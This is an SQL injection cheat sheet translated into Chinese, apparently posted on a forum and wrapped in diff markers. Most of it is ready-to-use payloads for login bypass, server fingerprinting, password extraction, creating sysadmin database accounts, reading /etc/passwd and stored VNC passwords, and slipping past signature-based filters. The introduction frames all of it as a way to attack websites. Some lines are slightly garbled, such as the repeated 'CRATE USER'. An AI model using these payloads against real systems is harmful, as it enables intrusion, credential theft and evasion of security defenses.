@@ -1,0 +1,212 @@
+SQL注射资料
+译文作者： zeroday@blacksecurity.org
+
+翻译作者：漂浮的尘埃[S.S.T]
+
+1．  介绍
+
+2．  漏洞测试
+
+3．  收集信息
+
+4．  数据类型
+
+5．  获取密码
+
+6．  创建数据库帐号
+
+7．  MYSQL操作系统交互作用
+
+8．  服务器名字与配置
+
+9．  从注册表中获取VNC密码
+
+10．逃避标识部分信号
+
+11．用Char()进行MYSQL输入确认欺骗
+
+12．用注释逃避标识部分信号
+
+13．没有引号的字符串
+
+
+
+1．  当服务器只开了80端口，我们几乎肯定管理员会为服务器打补丁。
+
+最好的方法就是转到网站攻击。SQL注射是最普遍的网站攻击方法之一。
+
+你攻击网站程序，（ASP,JSP,PHP,CGI..）比服务器或者在服务器上运行的操作系统好的多。
+
+SQL注射是一种通过网页输入一个查询命令或者一条指令进行欺骗的方法，很多站点都是从用户的用户名，密码甚至email获取用户的参数。
+
+他们都使用SQL查询命令。
+
+
+
+2．  首先你用简单的进行尝试。
+
+- Login:' or 1=1--
+- Pass:' or 1=1--
+- http://website/index.asp?id=' or 1=1--
+这些是简单的方法，其他如下：
+
+- ' having 1=1--
+- ' group by userid having 1=1--
+- ' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--
+- ' union select sum(columnname) from tablename--
+
+
+
+3．收集信息
+
+- ' or 1 in (select @@version)--
+- ' union all select @@version--  /*这个优秀
+这些能找到计算机，操作系统，补丁的真实版本。
+
+
+
+4．数据类型
+
+Oracle  扩展
+-->SYS.USER_OBJECTS (USEROBJECTS)
+-->SYS.USER_VIEWS
+-->SYS.USER_TABLES
+-->SYS.USER_VIEWS
+-->SYS.USER_TAB_COLUMNS
+-->SYS.USER_CATALOG
+-->SYS.USER_TRIGGERS
+-->SYS.ALL_TABLES
+-->SYS.TAB
+
+MySQL  数据库， C:\WINDOWS>type my.ini得到root密码
+-->mysql.user
+-->mysql.host
+-->mysql.db
+
+MS access
+-->MsysACEs
+-->MsysObjects
+-->MsysQueries
+-->MsysRelationships
+
+MS SQL Server
+-->sysobjects
+-->syscolumns
+-->systypes
+-->sysdatabases
+
+
+
+
+5.获取密码
+
+';begin declare @var varchar(8000) set @var=':' select
+
+@var=@var+'+login+'/'+password+' ' from users where login > @var select @var as var into temp end --
+
+' and 1 in (select var from temp)--
+
+' ; drop table temp --
+
+6.创建数据库帐号
+
+10．              MS SQL
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'  加为数据库管理员
+
+MySQL
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+
+Access
+CRATE USER name IDENTIFIED BY 'pass123'
+
+Postgres (requires Unix account)
+CRATE USER name WITH PASSWORD 'pass123'
+
+Oracle
+CRATE USER name IDENTIFIED BY pass123
+        TEMPORARY TABLESPACE temp
+        DEFAULT TABLESPACE users;
+GRANT CONNECT TO name;
+GRANT RESOURCE TO name;
+
+
+
+7. MYSQL操作系统交互作用
+
+- ' union select 1,load_file('/etc/passwd'),1,1,1;  这里用到load_file()函数
+
+
+
+8.服务器名字与配置
+
+
+
+-        ' and 1 in (select @@servername)--
+- ' and 1 in (select servername from master.sysservers)--
+
+
+
+9．从注册表中获取VNC密码
+
+- '; declare @out binary(8)
+- exec master..xp_regread
+- @rootkey = 'HKEY_LOCAL_MACHINE',
+- @key = 'SOFTWARE\ORL\WinVNC3\Default',  /*VNC4路径略有不同
+- @value_name='password',
+- @value = @out output
+- select cast (@out as bigint) as x into TEMP--
+- ' and 1 in (select cast(x as varchar) from temp)--
+
+
+
+10．逃避标识部分信号
+
+Evading ' OR 1=1 Signature
+- ' OR 'unusual' = 'unusual'
+- ' OR 'something' = 'some'+'thing'
+- ' OR 'text' = N'text'
+- ' OR 'something' like 'some%'
+- ' OR 2 > 1
+- ' OR 'text' > 't'
+- ' OR 'whatever' in ('whatever')
+- ' OR 2 BETWEEN 1 and 3
+
+
+
+
+11．用Char()进行MYSQL输入确认欺骗
+
+不用引号注射（string = "%"）
+
+--> ' or username like char(37);
+
+用引号注射(string="root"):
+
+è      ' union select * from users where login = char(114,111,111,116);
+load files in unions (string = "/etc/passwd"):
+-->'unionselect 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+Check for existing files (string = "n.ext"):
+-->' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
+
+
+
+
+12. 用注释逃避标识部分信号
+
+-->'/**/OR/**/1/**/=/**/1
+-->Username:' or 1/*
+-->Password:*/=1--
+-->UNI/**/ON SEL/**/ECT
+-->(Oracle)    '; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+-->(MS SQL)    '; EXEC ('SEL' + 'ECT US' + 'ER')
+
+
+
+
+13.没有引号的字符串
+
+--> INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72), 0x64) 
+
+收藏 分享 评分 
